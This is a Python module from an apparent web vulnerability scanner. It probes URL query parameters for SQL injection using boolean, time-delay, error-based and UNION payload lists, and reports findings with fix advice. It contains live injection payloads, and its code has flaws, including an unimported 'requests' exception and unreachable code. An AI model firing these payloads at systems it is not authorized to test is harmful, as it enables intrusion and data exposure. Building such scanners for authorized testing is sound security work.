"""SQL Injection attack module - Boolean-based and Time-based detection."""
from typing import Dict, List
import time
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .async_base import AsyncBaseAttackModule


class SQLiModule(AsyncBaseAttackModule):
    """Detects SQL injection vulnerabilities."""
    
    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' OR '1'='1", "' OR '1'='2"),  # True vs False
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("admin' OR '1'='1'--", "admin' OR '1'='2'--"),
    ]
    
    # Time-based payloads (sleep 5 seconds)
    TIME_PAYLOADS = [
        "' OR SLEEP(5)--",
        "' AND SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "; WAITFOR DELAY '00:00:05'--",  # SQL Server
        "' OR pg_sleep(5)--",  # PostgreSQL
    ]
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",  # Simple quote to trigger syntax error
        "'--",  # Quote with SQL comment
        "')--",  # Close parenthesis with comment
        "'))--",  # Double close parenthesis
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
    ]
    
    # UNION-based payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,version(),NULL--",
        "' UNION SELECT NULL,@@version,NULL--",
    ]
    
    def __init__(self, config: dict):
        """Initialize SQLi module."""
        super().__init__(config)
        self.timeout = config.get('performance', {}).get('timeout', 10)
        self.diff_threshold = 100  # Byte difference threshold for boolean detection
        self.time_threshold = 4.5  # Minimum seconds for time-based detection
    
    def name(self) -> str:
        """Return module name."""
        return "sqli"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects SQL injection vulnerabilities (Boolean, Time-based, Error-based, UNION)"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if SQLi module should run on this parameter.
        
        Args:
            parameter: Parameter dict
            context: Context dict
        
        Returns:
            bool: True if parameter looks like it might be SQL-injectable
        """
        if not parameter.get('name'):
            return False
        
        param_name = parameter['name'].lower()
        param_value = parameter.get('value', '')
        
        # Apply to parameters that commonly interact with databases
        sql_indicators = [
            'id', 'search', 'query', 'filter', 'sort', 'user', 'page', 'item',
            'q',  # Common search parameter
            'keyword', 'term', 'find', 'name', 'email', 'username',
            'category', 'cat', 'type', 'status', 'order', 'limit', 'offset',
            'pid', 'uid', 'cid', 'post', 'product', 'article'
        ]
        
        if any(indicator in param_name for indicator in sql_indicators):
            return True
        
        # Apply if value looks numeric (common for database IDs)
        if param_value and param_value.isdigit():
            return True
        
        return False
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> List[Dict]:
        """Scan for SQL injection vulnerabilities.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            client: httpx AsyncClient
        
        Returns:
            list: Findings
        """
        if self.config.get('verbose'):
            print(f"[DEBUG] SQLi scanning {url} with parameter {parameter.get('name')}")
        
        findings = []
        
        # Try error-based SQLi first (fastest and most reliable)
        error_finding = await self._test_error_based(url, parameter['name'], parameter['location'], client)
        if error_finding:
            findings.append(error_finding)
            return findings  # Found SQLi, no need to test further
        
        # Try boolean-based SQLi
        boolean_finding = await self._test_boolean_sqli(url, parameter, client)
        if boolean_finding:
            findings.append(boolean_finding)
            return findings  # Found SQLi
        
        # Try UNION-based SQLi
        union_finding = await self._test_union_based(url, parameter['name'], parameter['location'], client)
        if union_finding:
            findings.append(union_finding)
            return findings  # Found SQLi
        
        # Try time-based SQLi (slowest, only if others didn't find anything)
        time_finding = await self._test_time_sqli(url, parameter, client)
        if time_finding:
            findings.append(time_finding)
        
        return findings
        
        return findings
    
    async def _test_boolean_sqli(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for boolean-based SQL injection.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        param_name = parameter['name']
        param_location = parameter['location']
        
        # Get baseline response
        try:
            baseline_response = await client.get(url, timeout=self.timeout)
            baseline_size = len(baseline_response.content)
        except (httpx.HTTPError, httpx.TimeoutException):
            return None
        
        # Test each payload pair
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                # Test TRUE condition
                true_url = self._inject_payload(url, param_name, true_payload, param_location)
                true_response = await client.get(true_url, timeout=self.timeout)
                true_size = len(true_response.content)
                
                # Test FALSE condition
                false_url = self._inject_payload(url, param_name, false_payload, param_location)
                false_response = await client.get(false_url, timeout=self.timeout)
                false_size = len(false_response.content)
                
                # Check for differential response
                size_diff = abs(true_size - false_size)
                
                if size_diff > self.diff_threshold:
                    # Found evidence of SQLi
                    evidence = (
                        f"Boolean-based SQLi detected. "
                        f"True payload size: {true_size} bytes, "
                        f"False payload size: {false_size} bytes "
                        f"(difference: {size_diff} bytes)"
                    )
                    
                    return {
                        'name': 'SQL Injection - Boolean-Based',
                        'severity': 'High',
                        'url': url,
                        'parameter': param_name,
                        'payload': true_payload,
                        'evidence': evidence,
                        'recommendation': 'Use parameterized queries (prepared statements) with bound parameters. Never concatenate user input into SQL queries. Use ORM frameworks with proper escaping. Implement input validation and least privilege database access.'
                    }
            
            except (httpx.HTTPError, httpx.TimeoutException):
                continue
        
        return None
    
    async def _test_time_sqli(self, url: str, parameter: dict, client: httpx.AsyncClient) -> Dict:
        """Test for time-based SQL injection.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        param_name = parameter['name']
        param_location = parameter['location']
        
        # Test each time payload
        for payload in self.TIME_PAYLOADS:
            try:
                test_url = self._inject_payload(url, param_name, payload, param_location)
                
                start_time = time.time()
                response = await client.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start_time
                
                # If response took significantly longer, likely SQLi
                if elapsed >= self.time_threshold:
                    evidence = (
                        f"Time-based SQLi detected. "
                        f"Response time: {elapsed:.2f}s "
                        f"(expected delay: 5s)"
                    )
                    
                    return {
                        'name': 'SQL Injection - Time-Based',
                        'severity': 'High',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': evidence
                    }
            
            except requests.exceptions.Timeout:
                # Timeout could indicate successful injection
                return {
                    'name': 'SQL Injection - Time-Based',
                    'severity': 'High',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Request timed out (>{self.timeout}s), indicating successful time-based injection",
                    'recommendation': 'Use parameterized queries (prepared statements) exclusively. Avoid dynamic SQL construction. Implement database query timeout limits. Use ORM frameworks with built-in protection against SQL injection.'
                }
            
            except (httpx.HTTPError, httpx.TimeoutException):
                continue
        
        return None
    
    async def _test_error_based(self, url: str, param_name: str, param_location: str, client: httpx.AsyncClient) -> Dict:
        """Test for error-based SQL injection.
        
        Args:
            url: Target URL
            param_name: Parameter name
            param_location: Parameter location
            session: Requests session
        
        Returns:
            dict: Finding if vulnerability detected, None otherwise
        """
        # SQL error patterns
        error_patterns = [
            'SQL syntax',
            'mysql_fetch',
            'pg_query',
            'ORA-',
            'Microsoft SQL',
            'ODBC SQL',
            'SQLite',
            'SQLITE_ERROR',  # SQLite specific
            'sqlite3.OperationalError',  # Python SQLite
            'incomplete input',  # SQLite error
            'unrecognized token',  # SQLite error
            'syntax error',
            'unterminated quoted string',
            'quoted string not properly terminated',
            'mysql_num_rows',
            'mysql_query',
            'postgresql',
            'warning: pg',
            'valid MySQL result',
            'SQLSTATE',
            'SQL error',
            'database error',
            'query failed',
        ]
        
        for payload in self.ERROR_PAYLOADS[:6]:  # Test first 6 including simple quotes
            try:
                test_url = self._inject_payload(url, param_name, payload, param_location)
                response = await client.get(test_url, timeout=self.timeout)
                
                response_lower = response.text.lower()
                
                for pattern in error_patterns:
                    if pattern.lower() in response_lower:
                        return {
                            'name': 'SQL Injection - Error-Based',
                            'severity': 'High',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'SQL error pattern "{pattern}" detected in response',
                            'recommendation': 'Use parameterized queries with bound parameters. Implement custom error pages that do not expose database errors. Use prepared statements for all database queries. Apply principle of least privilege for database accounts.'
                        }
            
            except (httpx.HTTPError, httpx.TimeoutException):
                continue
        
        return None
    
    async def _test_union_based(self, url: str, param_name: str, param_location: str, client: httpx.AsyncClient) -> Dict:
        """Test for UNION-based SQL injection.
        
        Args:
            url: Target URL
            param_name: Parameter name
            param_location: Parameter location
            session: Requests session
        
        Returns:
            dict: Finding if vulnerability detected, None otherwise
        """
        try:
            # Get baseline
            baseline_url = url
            baseline_response = await client.get(baseline_url, timeout=self.timeout)
            baseline_length = len(baseline_response.text)
            
            for payload in self.UNION_PAYLOADS[:4]:  # Test first 4
                try:
                    test_url = self._inject_payload(url, param_name, payload, param_location)
                    response = await client.get(test_url, timeout=self.timeout)
                    
                    # UNION queries often significantly change response size
                    size_diff = abs(len(response.text) - baseline_length)
                    
                    if size_diff > 500 and response.status_code == 200:
                        # Check for version information in response
                        version_indicators = [
                            'mysql',
                            'mariadb',
                            'postgresql',
                            'microsoft sql',
                            'oracle',
                            '5.',  # MySQL version
                            '8.',  # MySQL version
                            '10.',  # PostgreSQL version
                        ]
                        
                        response_lower = response.text.lower()
                        for indicator in version_indicators:
                            if indicator in response_lower:
                                return {
                                    'name': 'SQL Injection - UNION-Based',
                                    'severity': 'High',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': f'UNION query successful, database info leaked: "{indicator}"',
                                    'recommendation': 'Use parameterized queries to prevent SQL injection. Never expose database version or schema information. Implement proper access controls. Use stored procedures with parameterized inputs where possible.'
                                }
                        
                        # Even without version info, significant size change is suspicious
                        if size_diff > 1000:
                            return {
                                'name': 'Potential SQL Injection - UNION-Based',
                                'severity': 'High',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f'UNION query caused significant response size change ({size_diff} bytes)',
                                'recommendation': 'Use parameterized queries (prepared statements) for all database operations. Validate and sanitize all user inputs. Implement web application firewall (WAF) rules. Conduct regular security code reviews.'
                            }
                
                except (httpx.HTTPError, httpx.TimeoutException):
                    continue
        
        except (httpx.HTTPError, httpx.TimeoutException):
            pass
        
        return None
    
    def _inject_payload(self, url: str, param_name: str, payload: str, location: str) -> str:
        """Inject payload into parameter.
        
        Args:
            url: Base URL
            param_name: Parameter name
            payload: Payload to inject
            location: Parameter location ('query' or 'body')
        
        Returns:
            str: Modified URL
        """
        parsed = urlparse(url)
        
        if location == 'query':
            # Parse existing query params
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            # Inject payload
            params[param_name] = [payload]
            
            # Rebuild query string
            new_query = urlencode(params, doseq=True)
            
            # Rebuild URL
            return urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
        
        # For body parameters, would need POST request handling
        # Simplified for GET-based SQLi testing
        return url
